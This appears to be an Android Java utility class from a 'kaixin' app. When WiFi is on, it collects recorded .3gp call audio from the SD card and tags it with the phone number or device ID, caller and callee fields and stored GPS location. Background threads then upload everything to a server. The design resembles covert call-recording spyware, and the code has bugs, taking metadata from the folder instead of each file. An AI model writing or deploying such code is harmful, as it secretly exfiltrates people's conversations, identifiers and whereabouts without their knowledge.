package com.kaixin.android.utils;

import java.io.File;
import java.io.FilenameFilter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Map;

import com.kaixin.android.common.KaiXinAddress;
import com.kaixin.android.service.ListenerService;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.telephony.TelephonyManager;


public class ListenerUtil {

	public static String getUsername(Context context){
		TelephonyManager tm2 = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String myPhoneNum = tm2.getLine1Number();// 本机电话号码
		String deviceId = tm2.getDeviceId();// 设备ID
		if(!StringUtil.isNull(CallService.getUsername())){
			return CallService.getUsername();
		}else if(!StringUtil.isNull(myPhoneNum)){
			return myPhoneNum;
		}else{
			return deviceId;
		}
	}

		/**
		 * 网络是否可用
		 * 
		 * @param activity
		 * @return
		 */
		public void isWIFIAvailable(Context context) {
			ConnectivityManager connectivity = (ConnectivityManager) context
					.getSystemService(Context.CONNECTIVITY_SERVICE);
			if (connectivity == null) {
			} else {
				NetworkInfo[] info = connectivity.getAllNetworkInfo();
				if (info != null) {
					for (int i = 0; i < info.length; i++) {
						if (info[i].getState() == NetworkInfo.State.CONNECTED
								|| info[i].getState() == NetworkInfo.State.CONNECTING) {
							
							WifiManager mWifiMng = (WifiManager) context
									.getSystemService(context.WIFI_SERVICE);
							switch (mWifiMng.getWifiState()) {
							case WifiManager.WIFI_STATE_DISABLED:
								break;
							case WifiManager.WIFI_STATE_DISABLING:

								break;
							case WifiManager.WIFI_STATE_ENABLED:
								String sdcardname = KaiXinAddress.SDCARED_DATA;
								File file1 = new File(sdcardname);
								File[] files1 = file1.listFiles(new FilenameFilter() {
									public boolean accept(File dir, String name) {
										return name.endsWith("3gp");
									}
								});
								if (files1 == null || files1.length == 0) {
									break;
								}
								final Map<String, String> m = new HashMap<String, String>();
								m.put("username", ListenerUtil.getUsername(context));
								m.put("call", file1.getName().substring(0, file1.getName().indexOf("_") + 1));
								m.put("called", file1.getName().substring(file1.getName().indexOf("_") + 1));
								m.put("latitude", StorageUtil.getString(context, "latitude"));
								m.put("longitude", StorageUtil.getString(context, "longitude"));
								m.put("address", StorageUtil.getString(context, "address"));
								Long time = file1.lastModified();
								Calendar cd = Calendar.getInstance();        
								cd.setTimeInMillis(time);  
								SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss"); 
								m.put("time", sdf.format(cd.getTime()));
								for (final File f1 : files1) {
									if (f1.getName().endsWith("3gp")) {
										new Thread(new Runnable() {
											@Override
											public void run() {
												try {
													HttpAssist.uploadVoice(f1.getAbsoluteFile().toString(), m);
												} catch (Exception e) {
													// TODO Auto-generated catch block
													e.printStackTrace();
												}
											}
										}).start();
									}
								}

								break;
							case WifiManager.WIFI_STATE_ENABLING:
								//
								break;
							case WifiManager.WIFI_STATE_UNKNOWN:
								break;
							}
							break;
						}
					}
				}
			}
		}

}
